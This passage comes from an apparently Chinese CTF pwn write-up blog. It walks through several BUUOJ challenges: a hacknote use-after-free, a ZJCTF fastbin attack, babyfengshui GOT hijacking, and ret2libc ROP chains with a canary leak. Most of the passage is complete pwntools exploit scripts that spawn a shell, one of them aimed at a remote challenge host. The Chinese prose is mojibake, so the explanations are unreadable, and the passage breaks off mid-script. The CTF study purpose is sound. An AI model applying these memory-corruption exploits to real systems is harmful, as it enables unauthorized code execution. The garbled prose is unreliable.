<p><img src="https://i.loli.net/2020/12/03/6Fg3EXu5rqiH9wQ.png" alt="image.png"></p>
<p>åœ¨æ‰“å°å †å—æ—¶ä¼šè°ƒç”¨å°chunkä¸­çš„å‡½æ•°æŒ‡é’ˆæ¥æ‰“å°å †å—å†…å®¹</p>
<p><img src="https://i.loli.net/2020/12/03/m2nw4WfoP8cGgsS.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨é‡Šæ”¾å †å—çš„è¿‡ç¨‹ä¸­å¹¶æœªå°†å †å—æŒ‡é’ˆç½®0ï¼Œ<strong>å­˜åœ¨UAFæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2020/12/03/ZkwVJ34ifBMCytQ.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨åé—¨å‡½æ•°</p>
<p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606984117052.png" alt="1606984117052"></p>
<p>æ•…è€ƒè™‘é€šè¿‡fastbin double freeåˆ†é…åˆ°åŒä¸€ä¸ªå †å—åæ”¹å†™å‡½æ•°æŒ‡é’ˆä¸ºåé—¨å‡½æ•°åœ°å€åæ‰“å°å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./hacknote'</span>) <span class="comment"># remote('node3.buuoj.cn',28832)</span></span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Your choice :"</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Note size :"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Content :"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">8</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">8</span>, p32(backdoor)) <span class="comment"># idx 2, overlapping</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/03/yKXTYzOgBD4HIPW.png" alt="image.png"></p>
<h1 id="0x02B-ZJCTF-2019-EasyHeap-fastbin-attack"><a href="#0x02B-ZJCTF-2019-EasyHeap-fastbin-attack" class="headerlink" title="0x02B.[ZJCTF 2019]EasyHeap - fastbin attack"></a>0x02B.[ZJCTF 2019]EasyHeap - fastbin attack</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/03/xyaWKuVEgNkX7rs.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°è¯¥ç¨‹åºå­˜åœ¨åˆ†é…ã€ç¼–è¾‘ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p>
<p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘å †å—çš„åœ°æ–¹ï¼Œå¯ä»¥è¾“å…¥ä»»æ„é•¿åº¦å†…å®¹é€ æˆå †æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/12/03/wRoqFJ6Z5VXpLeM.png" alt="image.png"></p>
<p>åˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥ä¿®æ”¹fastbinä¸­çš„fdåˆ†é…fake chunkæ¥è¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>åœ¨bssæ®µé™„è¿‘æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªsizeåˆé€‚çš„åœ°æ–¹</p>
<p><img src="https://i.loli.net/2020/12/03/SjcMlvYBCKwhfp6.png" alt="image.png"></p>
<p>ç”±äºpltè¡¨ä¸­å°±æœ‰systemå‡½æ•°ï¼Œæ•…è€ƒè™‘åˆ†é…ä¸€ä¸ªbssæ®µä¸Šçš„fake chunkåä¿®æ”¹ä»»ä¸€å †å—æŒ‡é’ˆä¸º<code>free@got</code>åä¿®æ”¹<code>free@got</code>ä¸º<code>system@plt</code>åfreeæ‰ä¸€ä¸ªå†…å®¹ä¸º<code>&quot;/bin/sh\x00&quot;</code>çš„chunkå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/03/w2WaI8uy7Sb1hsz.png" alt="image.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26930</span>)</span><br><span class="line">e = ELF(<span class="string">'./easyheap'</span>)</span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Your choice :"</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Size of Heap : "</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Content of heap:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Size of Heap : "</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Content of heap : "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">b'A'</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020a0</span> - <span class="number">3</span> + <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">114514</span>, payload)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 5, fake chunk on the bss</span></span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b'\xaa'</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(e.got[<span class="string">'free'</span>])</span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x100</span>, payload2)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x10</span>, p64(e.plt[<span class="string">'system'</span>]))</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/03/R5qOZ8lECUYPbN6.png" alt="image.png"></p>
<blockquote>
<p>å…¶å®æœ‰ä¸€ä¸ªcat flagçš„åé—¨å‡½æ•°ï¼Œä¸è¿‡pwnçš„æœ€ç»ˆç›®çš„è‡ªç„¶æ˜¯getshellï¼Œ<del>æ‰€ä»¥è¿™ä¸ªåé—¨å‡½æ•°å¯¹ğŸ‘´æ¥è¯´ä¸å­˜åœ¨çš„</del></p>
</blockquote>
<h1 id="0x02C-babyfengshui-33c3-2016-got-table-hijack"><a href="#0x02C-babyfengshui-33c3-2016-got-table-hijack" class="headerlink" title="0x02C.babyfengshui_33c3_2016 - got table hijack"></a>0x02C.babyfengshui_33c3_2016 - got table hijack</h1><p><del>å †é¢˜é›†ä¸­åœ°å¸¦è¯·å°å¿ƒ</del></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºåˆ†é…å †å—æ—¶æ‰€ç”Ÿæˆçš„å¤§è‡´ç»“æ„åº”å½“å¦‚ä¸‹ï¼Œä¸”<strong>è¯¥ç»“æ„ä½“mallocçš„å¤§å°ä¸º0x80ï¼Œå¤„åœ¨unsorted bin èŒƒå›´å†…</strong></p>
<p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" alt="image.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºå¯¹è¾“å…¥é•¿åº¦çš„æ£€æµ‹ï¼Œå®ƒæ˜¯æ£€æµ‹çš„æ˜¯<strong>æˆ‘ä»¬æ‰€è¾“å…¥çš„é•¿åº¦æ˜¯å¦å¤§äºä»description chunkçš„addråˆ°struct chunkçš„prev_sizeçš„é•¿åº¦</strong></p>
<p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" alt="image.png"></p>
<p>åœ¨å¸¸è§„æƒ…å†µä¸‹æˆ‘ä»¬ä¼¼ä¹åªèƒ½å¤Ÿè¦†å†™æ‰PREV_SIZEçš„ä¸€éƒ¨åˆ†ï¼Œä¸ç—›ä¸ç—’</p>
<p>ä½†æ˜¯è€ƒè™‘è¿™æ ·çš„ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬å…ˆåˆ†é…ä¸¤ä¸ªå¤§å—ï¼ˆchunk<em>4ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå—çš„sizeè¦åœ¨unsortedèŒƒå›´å†…ï¼‰ï¼Œä¹‹åé‡Šæ”¾æ‰ç¬¬ä¸€ä¸ªå¤§å—ï¼Œå†åˆ†é…ä¸€ä¸ªsizeæ›´å¤§çš„å—ï¼Œunsorted binå†…å°±ä¼šä»è¿™ä¸ªå¤§chunkï¼ˆç”±ä¸¤ä¸ªchunkåˆå¹¶è€Œæ¥ï¼‰ä¸­åˆ‡å‰²ä¸€ä¸ªå¤§chunkç»™åˆ°descriptionï¼Œä¹‹åå†ä»ä¸‹æ–¹çš„top chunkåˆ‡å‰²0x90æ¥ç»™åˆ°structï¼Œè¿™ä¸ªæ—¶å€™*</em>ç”±äºå¯¹lengthçš„é”™è¯¯åˆ¤å®šå°±ä¼šå¯¼è‡´æˆ‘ä»¬æœ‰æœºä¼šè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„å†…å®¹**</p>
<p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘å…ˆè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„description addrä¸ºfree@gotåæ³„æ¼å‡ºlibcçš„åŸºå€ï¼Œåå†ä¿®æ”¹free@gotä¸ºsystemå‡½æ•°åœ°å€åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º<code>&quot;/bin/sh&quot;</code>çš„chunkå³å¯é€šè¿‡<code>system(&quot;/bin/sh&quot;)</code>æ¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./babyfengshui_33c3_2016'</span>) <span class="comment"># remote('node3.buuoj.cn',26486)</span></span><br><span class="line">e = ELF(<span class="string">'./babyfengshui_33c3_2016'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Action: "</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, name, length:int, descryption)</span>:</span></span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size of description: "</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"name: "</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b"text length: "</span>)</span><br><span class="line">    p.sendline(str(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text: "</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, length:int, descryption)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text length: "</span>)</span><br><span class="line">    p.sendline(str(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text: "</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    big_size = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span></span><br><span class="line">    padding_length = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">    new(big_size, <span class="string">"arttnba3"</span>, padding_length + <span class="number">4</span>, <span class="string">b'A'</span> * padding_length + p32(e.got[<span class="string">'free'</span>])) <span class="comment"># idx 3</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b"description: "</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, p32(libc_base + libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" alt="image.png"></p>
<blockquote>
<p>ä»¥å‰åšå †éƒ½æ˜¯64ä½èµ·æ‰‹ï¼Œè¿™32ä½çš„å †é¢˜å±å®æŠŠæˆ‘å‘åˆ°äº†ï¼Œ<del>æˆ‘æ„£æ˜¯æ‹¿ç€64ä½çš„libcæ€¼äº†åŠå¤©ï¼Œä»¥åŠæ¯«ä¸æ€ç´¢å°±å†™çš„0x10çš„chunkå¤´</del></p>
<p>æœ¬é¢˜åŸé¢˜æ¥è‡ªäºC3CTFï¼Œæ­ªå›½äººçš„é¢˜ç›®è´¨é‡å…¶å®è¿˜æ˜¯å¯ä»¥çš„ï¼ˆå½“ç„¶ç°åœ¨æˆ‘ä¹Ÿå°±åªèƒ½å†™å¾—å‡ºç­¾åˆ°é¢˜233333</p>
</blockquote>
<h1 id="0x02D-picoctf-2018-rop-chain-ret2libc"><a href="#0x02D-picoctf-2018-rop-chain-ret2libc" class="headerlink" title="0x02D.picoctf_2018_rop chain - ret2libc"></a>0x02D.picoctf_2018_rop chain - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œ åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/04/4g6RJGxlf73ZTAB.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/04/fBGecSvgaFmsdCb.png" alt="image.png"></p>
<p>å¾ˆå¤§å¾ˆç›´æ¥çš„ä¸€ä¸ªæº¢å‡ºçš„æ¼æ´</p>
<p>ç”±äºæ²¡æœ‰èƒ½ç›´æ¥getshellçš„gadgetï¼Œè¿˜æ˜¯è€ƒè™‘ret2libcï¼šæ„é€ ropé“¾æ³„éœ²libcåŸºå€åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./PicoCTF_2018_rop_chain'</span>) <span class="comment"># remote('node3.buuoj.cn', 28376)</span></span><br><span class="line">e = ELF(<span class="string">'./PicoCTF_2018_rop_chain'</span>)</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">'puts'</span>]) + p32(e.sym[<span class="string">'main'</span>]) + p32(e.got[<span class="string">'puts'</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/04/GmnYAjS7r6DUbpC.png" alt="image.png"></p>
<h1 id="0x02E-bjdctf-2020-babyrop2-fmtstr-ret2libc"><a href="#0x02E-bjdctf-2020-babyrop2-fmtstr-ret2libc" class="headerlink" title="0x02E.bjdctf_2020_babyrop2 - fmtstr + ret2libc"></a>0x02E.bjdctf_2020_babyrop2 - fmtstr + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/04/uH6V1kLP3M5TizI.png" alt="image.png"></p>
<p>åœ¨giftå‡½æ•°ä¸­å¯ä»¥æ³„éœ²canary</p>
<p><img src="https://i.loli.net/2020/12/04/K7psfAMFocnalTy.png" alt="image.png"></p>
<p>åœ¨vulnä¸­ç›´æ¥å°±æœ‰ä¸€ä¸ªæº¢å‡º</p>
<p><img src="https://i.loli.net/2020/12/04/XHYVtGCxol92dNE.png" alt="image.png"></p>
<p>é‚£ä¹ˆå…ˆæ³„éœ²canaryå†ret2libcå³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bjdctf_2020_babyrop2'</span>) <span class="comment"># remote('node3.buuoj.cn', 26028)</span></span><br><span class="line">e = ELF(<span class="string">'./bjdctf_2020_babyrop2'</span>)</span><br><span class="line">offset = <span class="number">0x20</span> - <span class="number">8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'%7$p'</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">canary = int(p.recvuntil(<span class="string">'\n'</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(e.got[<span class="string">'puts'</span>]) + p64(e.plt[<span class="string">'puts'</span>]) + p64(e.sym[<span class="string">'vuln'</span>])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span 